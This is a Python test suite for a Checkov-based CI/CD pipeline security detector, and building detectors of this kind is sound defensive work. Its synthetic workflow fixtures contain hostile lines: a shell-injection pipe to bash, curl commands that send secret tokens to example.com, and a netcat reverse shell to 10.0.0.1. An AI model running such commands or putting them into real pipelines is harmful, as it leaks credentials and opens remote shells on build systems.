"""Tests for the CI/CD pipeline detector's deterministic half: real
Checkov subprocess calls (not mocked — matches this project's standing
testing discipline), the six curated checks (5 GitHub Actions + 1
GitLab CI), schema conformance, and catalog consistency.

Error-handling/exit-code/JSON-normalization behavior is exercised at
the shared common/test_checkov_wrapper.py level (011's own precedent);
this file focuses on this plan's own curated rule catalog and
end-to-end detection against real fixtures.

Requires the real `checkov` CLI on PATH (`pip install checkov`, already
a dependency via detectors/iac/requirements.txt — 013 is its second
consumer, not re-declared here). Run with: python3 -m unittest
test_scanner -v (from inside detectors/cicd/).
"""

from __future__ import annotations

import io
import json
import shutil
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

import scanner
from rules import CHECKOV_RULES
from scanner import ScannerError

DETECTOR_DIR = Path(__file__).parent
SECURITY_SKILL_DIR = next(p for p in DETECTOR_DIR.resolve().parents if (p / "common").is_dir())
SCHEMA_DIR = SECURITY_SKILL_DIR / "schema"

sys.path.insert(0, str(SECURITY_SKILL_DIR / "common"))
from schema_validation import validate_against_schema  # noqa: E402

sys.path.insert(0, str(SECURITY_SKILL_DIR / "knowledge"))
import standards  # noqa: E402


def _checkov_available() -> bool:
    return shutil.which("checkov") is not None


# Deliberately obvious/synthetic fixtures, not real-world content —
# enough for Checkov to actually fire, not just "look" vulnerable.
# Every rule this fixture triggers was verified against the real
# checkov CLI at implementation (see plans/013-cicd-pipeline-skill.md).
GHA_VULNERABLE_WORKFLOW = """name: CI
on:
  push:
  workflow_dispatch:
    inputs:
      target:
        description: 'target'
        required: true
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
    steps:
      - uses: actions/checkout@v4
      - name: Bad shell injection
        run: |
          echo "${{ github.event.issue.title }}" | bash
      - name: Curl with secret
        run: |
          curl -s https://example.com --data "secret=${{ secrets.TOKEN }}"
      - name: Netcat reverse shell
        run: |
          nc 10.0.0.1 4444 -e /bin/sh
"""

GHA_CLEAN_WORKFLOW = """name: CI
on:
  push:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: |
          make build
"""

GITLAB_VULNERABLE_CI = """stages:
  - build

build:
  stage: build
  script:
    - echo "Building $CI_COMMIT_REF_NAME"
    - curl -s https://example.com --data "token=$CI_JOB_TOKEN"
"""

GITLAB_CLEAN_CI = """stages:
  - build

build:
  stage: build
  script:
    - echo "Building"
    - make build
"""

# All 6 curated rule_ids this plan's catalog produces — verified for
# real that GHA_VULNERABLE_WORKFLOW fires all 5 GitHub-Actions-curated
# rules in one fixture.
GHA_VULNERABLE_EXPECTED_RULE_IDS = {
    "cicd-pipeline.unsecure-commands-enabled",
    "cicd-pipeline.shell-injection-pattern",
    "cicd-pipeline.curl-with-secret-in-script",
    "cicd-pipeline.reverse-shell-pattern",
    "cicd-pipeline.workflow-dispatch-inputs-affect-build",
    "cicd-pipeline.excessive-top-level-permissions",
}


@unittest.skipUnless(_checkov_available(), "requires the real checkov CLI on PATH")
class PerFormatDetectionTests(unittest.TestCase):
    def _write(self, root: str, content: str, relative_path: str) -> Path:
        path = Path(root) / relative_path
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
        return path

    def test_github_actions_vulnerable_fixture_fires_all_six_curated_rules(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            self._write(tmp, GHA_VULNERABLE_WORKFLOW, ".github/workflows/vulnerable.yml")
            findings = scanner.scan_paths([tmp])
        rule_ids = {f["ruleId"] for f in findings}
        self.assertEqual(rule_ids, GHA_VULNERABLE_EXPECTED_RULE_IDS)
        for f in findings:
            self.assertEqual(f["artifactType"], "github-actions")
            self.assertEqual(f["subSkill"], "cicd-pipeline")

    def test_github_actions_clean_fixture_produces_no_curated_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            self._write(tmp, GHA_CLEAN_WORKFLOW, ".github/workflows/clean.yml")
            findings = scanner.scan_paths([tmp])
        self.assertEqual(findings, [])

    def test_gitlab_ci_vulnerable_fixture_fires_curated_rule(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, GITLAB_VULNERABLE_CI, ".gitlab-ci.yml")
            findings = scanner.scan_paths([str(path)])
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["ruleId"], "cicd-pipeline.curl-with-secret-in-script")
        self.assertEqual(findings[0]["artifactType"], "gitlab-ci")

    def test_gitlab_ci_clean_fixture_produces_no_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = self._write(tmp, GITLAB_CLEAN_CI, ".gitlab-ci.yml")
            findings = scanner.scan_paths([str(path)])
        self.assertEqual(findings, [])

    def test_mixed_directory_scans_both_formats_correctly(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            self._write(tmp, GHA_VULNERABLE_WORKFLOW, ".github/workflows/vulnerable.yml")
            self._write(tmp, GITLAB_VULNERABLE_CI, ".gitlab-ci.yml")
            findings = scanner.scan_paths([tmp])
        artifact_types = {f["artifactType"] for f in findings}
        self.assertEqual(artifact_types, {"github-actions", "gitlab-ci"})
        self.assertIn("cicd-pipeline.curl-with-secret-in-script", {f["ruleId"] for f in findings})


@unittest.skipUnless(_checkov_available(), "requires the real checkov CLI on PATH")
class SchemaConformanceTests(unittest.TestCase):
    def test_real_findings_validate_against_finding_schema(self) -> None:
        schema = json.loads((SCHEMA_DIR / "finding.schema.json").read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / ".github" / "workflows" / "vulnerable.yml"
            path.parent.mkdir(parents=True)
            path.write_text(GHA_VULNERABLE_WORKFLOW, encoding="utf-8")
            findings = scanner.scan_paths([str(tmp)])
        self.assertEqual(len(findings), 6)
        for f in findings:
            errors = validate_against_schema(schema, f)
            self.assertEqual(errors, [], f"{f['ruleId']} finding is not schema-valid: {errors}")


class ConsistencyTests(unittest.TestCase):
    def test_every_rule_reference_resolves_in_the_knowledge_base(self) -> None:
        for rule in CHECKOV_RULES:
            for ref in rule.references:
                self.assertTrue(standards.exists(ref["standard"], ref["id"]), f"{rule.rule_id} cites {ref}")

    def test_every_rule_id_matches_naming_convention(self) -> None:
        import re

        pattern = re.compile(r"^cicd-pipeline\.[a-z0-9-]+$")
        for rule in CHECKOV_RULES:
            self.assertTrue(pattern.match(rule.rule_id), rule.rule_id)

    def test_no_duplicate_rule_ids(self) -> None:
        all_rule_ids = [r.rule_id for r in CHECKOV_RULES]
        self.assertEqual(len(all_rule_ids), len(set(all_rule_ids)))

    def test_no_duplicate_check_id_per_framework(self) -> None:
        seen: dict[tuple[str, str], str] = {}
        for rule in CHECKOV_RULES:
            for framework, check_id in rule.check_ids.items():
                key = (framework, check_id)
                self.assertNotIn(key, seen, f"{key} claimed by both {seen.get(key)} and {rule.rule_id}")
                seen[key] = rule.rule_id

    def test_every_rule_severity_is_a_valid_schema_enum_value(self) -> None:
        valid_severities = {"Critical", "High", "Medium", "Low", "Info"}
        for rule in CHECKOV_RULES:
            self.assertIn(rule.severity, valid_severities, rule.rule_id)

    def test_every_rule_has_at_least_one_check_id(self) -> None:
        for rule in CHECKOV_RULES:
            self.assertTrue(rule.check_ids, rule.rule_id)

    def test_every_check_id_framework_is_in_scope(self) -> None:
        for rule in CHECKOV_RULES:
            for framework in rule.check_ids:
                self.assertIn(framework, scanner.FRAMEWORKS, f"{rule.rule_id} claims unknown framework {framework}")

    def test_cosign_checks_are_not_curated_here(self) -> None:
        # CKV_GHA_5/6 (Cosign artifact-signing/SBOM-attestation
        # presence) are deliberately deferred to 014 (Supply Chain
        # Skill) — this plan's own rule catalog must never claim them.
        claimed_check_ids = {check_id for rule in CHECKOV_RULES for check_id in rule.check_ids.values()}
        self.assertNotIn("CKV_GHA_5", claimed_check_ids)
        self.assertNotIn("CKV_GHA_6", claimed_check_ids)

    def test_dead_and_non_security_gitlab_checks_are_not_curated_here(self) -> None:
        # CKV_GITLABCI_2 (pipeline-efficiency, not security) and
        # CKV_GITLABCI_3 (verified dead code at this plan's kickoff —
        # its scan_conf() unconditionally returns PASSED) must never be
        # curated here.
        claimed_check_ids = {check_id for rule in CHECKOV_RULES for check_id in rule.check_ids.values()}
        self.assertNotIn("CKV_GITLABCI_2", claimed_check_ids)
        self.assertNotIn("CKV_GITLABCI_3", claimed_check_ids)


@unittest.skipUnless(_checkov_available(), "requires the real checkov CLI on PATH")
class MainCliTests(unittest.TestCase):
    def test_prints_findings_as_json_and_returns_0(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / ".gitlab-ci.yml"
            path.write_text(GITLAB_VULNERABLE_CI, encoding="utf-8")
            out = io.StringIO()
            with redirect_stdout(out):
                code = scanner.main([str(tmp)])
        self.assertEqual(code, 0)
        parsed = json.loads(out.getvalue())
        self.assertEqual(len(parsed), 1)

    def test_bad_path_returns_1_and_prints_error(self) -> None:
        err = io.StringIO()
        with redirect_stdout(io.StringIO()), redirect_stderr(err):
            code = scanner.main(["/tmp/definitely-does-not-exist-013-cicd"])
        self.assertEqual(code, 1)
        self.assertIn("SCANNER ERROR", err.getvalue())


class CrossPlatformEncodingTests(unittest.TestCase):
    def test_round_trip_non_ascii_content_with_explicit_utf8(self) -> None:
        text = "em dash — and middle dot · round-trip"
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "roundtrip.txt"
            path.write_text(text, encoding="utf-8")
            self.assertEqual(path.read_text(encoding="utf-8"), text)


class SourceEncodingAuditTests(unittest.TestCase):
    def test_no_read_or_write_text_call_omits_encoding(self) -> None:
        import ast

        violations = []
        for path in sorted(DETECTOR_DIR.glob("*.py")):
            tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
            for node in ast.walk(tree):
                if (
                    isinstance(node, ast.Call)
                    and isinstance(node.func, ast.Attribute)
                    and node.func.attr in ("read_text", "write_text")
                ):
                    kwarg_names = {kw.arg for kw in node.keywords}
                    if "encoding" not in kwarg_names:
                        violations.append(f"{path.name}:{node.lineno} .{node.func.attr}() missing encoding=")
        self.assertEqual(violations, [])


if __name__ == "__main__":
    unittest.main()
